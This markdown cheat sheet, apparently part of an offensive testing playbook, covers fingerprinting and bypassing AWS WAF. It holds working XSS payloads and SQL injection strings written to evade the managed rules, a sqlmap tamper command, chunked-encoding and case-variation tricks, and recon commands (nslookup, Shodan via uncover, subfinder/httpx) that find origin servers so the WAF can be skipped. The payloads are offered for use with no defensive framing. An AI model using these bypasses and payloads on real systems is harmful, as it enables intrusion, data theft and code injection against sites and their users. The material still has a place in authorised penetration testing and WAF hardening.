# AWS WAF

### Detection Signals
| Signal | Where |
|--------|-------|
| `x-amzn-RequestId` header | Response header |
| `x-amzn-trace-id` header | Response header (AWS X-Ray) |
| `x-amz-cf-id` header | CloudFront distribution ID |
| `server: AmazonS3` or `server: awselb/2.0` | Server header |
| 403 with `<!DOCTYPE html>` + "Request blocked" | WAF block page |
| `x-amzn-waf-action` header | Sometimes present on blocks |
| Content-Length patterns: 15 (ELB), 1484 (Azure FD equivalent) | CL:15 = AWS ELB default block |

### Bypass Strategy
- **Recommended tool**: curl-cffi or Burp. AWS WAF is less aggressive on browser fingerprinting than Akamai/Imperva.
- **Encoding tricks**: AWS WAF regex rules can be bypassed with chunked transfer encoding, double URL encoding.
- **Regional bypass**: If WAF is on CloudFront, try direct ALB/ELB endpoint (find via DNS/Shodan).
- **Rule bypass**: AWS WAF managed rules are regex-based — case variation and encoding often work.

### XSS Bypass
```
# AWS WAF managed XSS rules block: <script>, on*=, javascript:
# Bypasses:

# HTML entity encoding:
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>

# Tab/newline injection:
<img src=x onerror="al\x65rt(1)">
<a href="ja&#x0A;vascript:alert(1)">click</a>

# SVG namespace:
<svg><script>alert&#40;1&#41;</script></svg>
```

### SQLi Bypass
```
sqlmap --tamper=space2randomblank,unionalltoinunionall,percentage -u URL

# AWS WAF rule bypass:
' UniOn%09SeLeCt%091,2,3--
' /*!UNION*/ /*!SELECT*/ 1,2,3--

# Chunked transfer encoding:
Transfer-Encoding: chunked
(split SQL keywords across chunk boundaries)

# JSON-based SQLi (if JSON body accepted):
{"id":"1' UNION SELECT 1,2,3--"}
```

### Rate Limiting
- Configurable. Default managed rule: 2000 req/5min per IP.
- More permissive than Akamai/Imperva by default.
- Block response: 403 with AWS-specific block page.
- Recovery: Usually auto-unblocks after 5 minutes.

### Origin IP Discovery
```bash
# CloudFront origin:
nslookup TARGET  # Look for .elb.amazonaws.com or direct IP
# Shodan for exposed ALB/EC2:
uncover -q "ssl.cert.subject.CN:TARGET" -e shodan
# Check for S3 bucket as origin:
curl -sI https://TARGET | grep "x-amz-bucket-region"
# Direct IP via other subdomains not behind CloudFront
subfinder -d TARGET -silent | httpx -sc -cl | grep -v "cloudfront\|403"
```

---

